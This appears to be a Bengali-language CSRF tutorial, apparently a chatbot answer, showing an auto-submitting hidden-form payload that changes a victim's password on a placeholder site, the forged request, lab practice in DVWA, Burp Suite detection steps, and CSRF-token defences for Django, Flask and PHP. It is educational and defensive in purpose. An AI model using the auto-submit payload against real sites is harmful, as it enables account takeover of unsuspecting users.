@@ -1,0 +1,237 @@
+CSRF (Cross-Site Request Forgery) কাজ করার কৌশল – শিক্ষামূলক ব্যাখ্যা
+
+ধরা যাক, একটি ভিকটিম ওয়েব অ্যাপ্লিকেশন আছে যেখানে ব্যবহারকারী লগইন করে:
+
+URL (পাসওয়ার্ড পরিবর্তন):
+
+POST https://vulnerable-site.com/change-password
+Content-Type: application/x-www-form-urlencoded
+
+newPassword=hacked123
+
+1. আক্রমণের পূর্বশর্ত:
+
+ভিকটিম vulnerable-site.com-এ লগইন করা আছে।
+
+তাদের ব্রাউজারে session cookie বিদ্যমান।
+
+সার্ভার POST রিকোয়েস্টে কোনো CSRF টোকেন যাচাই করে না।
+
+
+
+---
+
+2. CSRF পে-লোড তৈরির ধাপ (শিক্ষার জন্য):
+
+<!-- attacker.html (সিমুলেশন): -->
+<form action="https://vulnerable-site.com/change-password" method="POST" id="csrfForm">
+  <input type="hidden" name="newPassword" value="hacked123">
+</form>
+
+<script>
+  document.getElementById('csrfForm').submit(); // অটো সাবমিট করে
+</script>
+
+এই কোড যদি ভিকটিমের ব্রাউজারে চালানো হয় (উদাহরণস্বরূপ, তারা attacker.com-এ ক্লিক করলে), তাহলে ব্রাউজার session cookie সহ POST রিকোয়েস্ট পাঠাবে vulnerable-site.com এ, কারণ cookie নিজে থেকেই যোগ হয়।
+
+
+---
+
+3. রিকোয়েস্ট এর প্রকৃত গঠন ব্রাউজার থেকে হবে:
+
+POST /change-password HTTP/1.1
+Host: vulnerable-site.com
+Cookie: session=abcd1234
+Content-Type: application/x-www-form-urlencoded
+
+newPassword=hacked123
+
+যেহেতু cookie যুক্ত হয়েছে, সার্ভার ধরে নিবে এটি ভিকটিমের অনুরোধ এবং পাসওয়ার্ড পরিবর্তন করে ফেলবে।
+
+
+---
+
+4. প্রতিরোধ না থাকলে ফলাফল:
+
+ভিকটিমের পাসওয়ার্ড attacker সেট করে দিল।
+
+তারা পরবর্তীতে লগইন করতে পারবে না।
+
+attacker "হ্যাক" সফল করলো।
+
+
+
+---
+
+এথিক্যাল উদ্দেশ্যে কীভাবে পরীক্ষার পরিবেশে শিখবে:
+
+✅ টেস্টিং প্ল্যাটফর্ম:
+
+1. DVWA (Damn Vulnerable Web Application) – https://github.com/digininja/DVWA
+
+
+2. OWASP Juice Shop – https://owasp.org/www-project-juice-shop/
+
+
+3. bWAPP – https://sourceforge.net/projects/bwapp/
+
+
+
+✅ টুলস:
+
+Burp Suite: Intercept করে অনুরোধ মডিফাই করা
+
+OWASP ZAP: CSRF vulnerability auto detect
+
+Postman: রিকোয়েস্ট ম্যানুয়ালি পাঠানোর জন্য
+
+
+
+---
+
+উপসংহার (অত্যন্ত গুরুত্বপূর্ণ)
+
+CSRF আক্রমণ বোঝা ও সিমুলেটেড পরিবেশে টেস্ট করা একজন সাইবার সিকিউরিটি শিক্ষার্থীর গুরুত্বপূর্ণ দক্ষতা। তবে, বাস্তব ওয়েবসাইট বা অন্য কারও সম্পত্তিতে এটি প্রয়োগ অবৈধ এবং শাস্তিযোগ্য অপরাধ।
+
+চমৎকার! নিচে আমি তোমার চাওয়া তিনটি বিষয়েই ডিটেইলস টিউটোরিয়াল দিচ্ছি:
+
+
+---
+
+১. DVWA দিয়ে CSRF টিউটোরিয়াল (স্টেপ-বাই-স্টেপ)
+
+প্রথম ধাপ: DVWA সেটআপ
+
+1. XAMPP বা LAMP ইনস্টল করো।
+
+
+2. DVWA GitHub থেকে কোড ডাউনলোড করো।
+
+
+3. htdocs ফোল্ডারে এক্সট্রাক্ট করো (XAMPP হলে C:\xampp\htdocs\dvwa)
+
+
+4. config/config.inc.php.dist ফাইল কপি করে config.inc.php করো।
+
+
+5. localhost/dvwa/setup.php ভিজিট করে DB তৈরি করো।
+
+
+
+দ্বিতীয় ধাপ: CSRF মডিউল টেস্ট
+
+1. ব্রাউজারে DVWA তে লগইন করো।
+
+
+2. Security Level: Low করো (DVWA সাইডবার থেকে)।
+
+
+3. CSRF অপশনে যাও (Left menu থেকে)।
+
+
+4. নতুন পাসওয়ার্ড দিয়ে সাবমিট করো।
+
+
+5. এবার সেই ফর্ম কপি করে একটি ম্যালিশাস HTML ফাইল বানাও (attacker.html) ও ভিকটিমকে ক্লিক করাও।
+
+
+
+
+---
+
+২. Burp Suite দিয়ে CSRF ধরার গাইড
+
+প্রসেস:
+
+1. Burp Suite চালু করো এবং browser proxy সেট করো (localhost:8080)।
+
+
+2. Burp এর Proxy > Intercept অন করো।
+
+
+3. টার্গেট ওয়েব অ্যাপের যে ফর্ম তোমার সন্দেহজনক মনে হচ্ছে, সেটা সাবমিট করো।
+
+
+4. Intercept-এ সেই রিকোয়েস্ট ক্যাপচার হবে।
+
+
+5. Request-এ CSRF Token আছে কিনা দেখো (hidden input, header, ইত্যাদি)।
+
+
+
+যদি না থাকে:
+
+Burp Suite এর Scanner বা Active Scan দিয়ে পরীক্ষা করো।
+
+Scanner রিপোর্টে "Cross-Site Request Forgery" দেখা যাবে।
+
+
+
+---
+
+৩. Django, Flask ও PHP-তে CSRF প্রতিরোধের কোড
+
+Django:
+
+Django নিজেই CSRF Middleware যুক্ত করে।
+
+<form method="POST">
+  {% csrf_token %}
+  <input type="text" name="email">
+  <input type="submit">
+</form>
+
+# views.py
+from django.views.decorators.csrf import csrf_protect
+
+@csrf_protect
+def my_view(request):
+    ...
+
+
+---
+
+Flask:
+
+Flask-WTF ব্যবহার করে:
+
+from flask_wtf import FlaskForm
+from wtforms import StringField, SubmitField
+from flask import Flask, render_template
+
+app = Flask(__name__)
+app.secret_key = 'your_secret_key'
+
+class MyForm(FlaskForm):
+    name = StringField('Name')
+    submit = SubmitField('Submit')
+
+<form method="POST">
+  {{ form.csrf_token }}
+  {{ form.name }}
+  {{ form.submit }}
+</form>
+
+
+---
+
+PHP:
+
+// csrf_token.php
+session_start();
+$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+
+<!-- form.html -->
+<form method="POST" action="process.php">
+  <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+  <input type="text" name="email">
+  <input type="submit">
+</form>
+
+// process.php
+session_start();
+if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+    die("CSRF validation failed!");
+}
+
+
